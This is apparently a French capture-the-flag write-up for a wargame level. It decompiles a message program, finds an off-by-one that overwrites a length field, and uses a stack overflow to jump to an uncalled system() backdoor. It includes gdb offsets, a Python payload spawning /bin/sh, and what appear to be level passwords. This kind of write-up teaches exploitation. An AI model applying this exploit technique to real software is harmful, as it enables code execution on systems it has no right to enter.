```
level09 : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

```c
int main()

{
  puts(
      "--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n- -------------------------------------------"
      );
  handle_msg();
  return 0;
}
```

```c
void handle_msg()

{
  char user [140];
  long local_3c[5];
  long local_14;
  
  local_3c = {0, 0, 0, 0, 0};
  local_14 = 140;
  set_username((long)user);
  set_msg(user);
  puts(">: Msg sent!");
  return;
}
```

Avec la suite du programme on constate que les locales de la fonction sont une structure:

```c
struct S_message {
	char message[140];
	char username[40];
	int len;
}
```

```c
void set_username(long value)

{
  long i;
  char *tmp;
  char string [17];
  int offset;
  
  tmp = string;
  for (i = 16; i != 0; i = i + -1) {
    *tmp = 0;
    tmp = tmp + 1;
  }
  puts(">: Enter your username");
  printf(">>: ");
  fgets((char *)string,128,_stdin);
  for (offset = 0; (offset < 41 && (*(char *)((long)string + (long)offset) != '\0'));
      offset = offset + 1) {
    *(char *)(value + 140 + (long)offset) = *(char *)((long)string + (long)offset);
  }
  printf(">: Welcome, %s",(char *)(value + 140));
  return;
}
```


```c
void set_msg(char *param_1)

{
  long i;
  undefined8 *tmp;
  undefined8 message [128];
  
  tmp = message;
  for (i = 128; i != 0; i = i + -1) {
    *tmp = 0;
    tmp = tmp + 1;
  }
  puts(">: Msg @Unix-Dude");
  printf(">>: ");
  fgets((char *)message,1024,_stdin);
  strncpy(param_1,(char *)message,(long)*(int *)(param_1 + 180));
  return;
}
```

Ici nous pouvons voir que le strncpy prends comme longueur l emplacement de la structure + 180m ce qui correspond donc a notre int len. Donc a la fin de notre utilisateur nous devons absolument lui donner la taille des 208 écritures.

```c
void secret_backdoor()

{
  char local_88 [128];
  
  fgets(local_88,128,_stdin);
  system(local_88);
  return;
}
```

On peux voir que la fonction secret_backdoor n'est pas appeler et qu'elle contient ce donc on a besoin, l'appel de 'system' avec un la possibilité de lui donner notre propre chaîne grave a fgets.

![[Pasted image 20240809225318.png]]

Le programme tourne en 64 bits, donc nos adresses devrons être sur 8 octets.

On lance le programme dans gdb et on va récupérer l'adresse de l'EIP un fois dans la fonction 'handle_msg'

```
b handle_msg
c
```

![[Pasted image 20240809234842.png]]

Il y a juste un push qui a ete effectue donc notre RIP se situe en seconde position.

![[Pasted image 20240810011712.png]]

```
Adresse ou est le RIP : 0x7fffffffe3c8
```

Comme on peut le voir que notre frame a une longueur de 208:

```
0x7fffffffe300 - 0x7fffffffe3d0 = d0 = 208
```

En analysant le programme nous pouvons voir que celui-ci nous demande d'entrer un 'username' et un 'message', le username est placer en fin de chaîne et juste a la suite nous avons la longueur en mémoire, nous allons devoir la reecrire. 
Dans le code nous pouvons voir que l'offset de la variable pour l'username est de 40 + 1 pour la len.
Il nous faut donc remplir au max le username + ajout 0xd0 pour la len
et pour le message lui sera écris au haut de la stack de la fonction handle_msg() ou l offset est de 208.

Nous allons donc faire un script qui fait ceci:

```
python -c "print '0' * 40 + '\xd0'" > /tmp/lv9
python -c "print '0' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n/bin/sh\n'" >> /tmp/lv9
(cat /tmp/lv9; cat) | ./level09
```

nous ajoutons "/bin/sh" afin que la fonction du syscall reçois directement la destination a exécuter (non obligatoire).

Nous devons l'appeler de manière un peu différente, c'est a dire qu'on le met entre () et on va appeler deux fois 'cat' afin de garder notre stdin ouvert.

![[Pasted image 20240809231337.png]]

![[Pasted image 20240810013109.png]]


j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE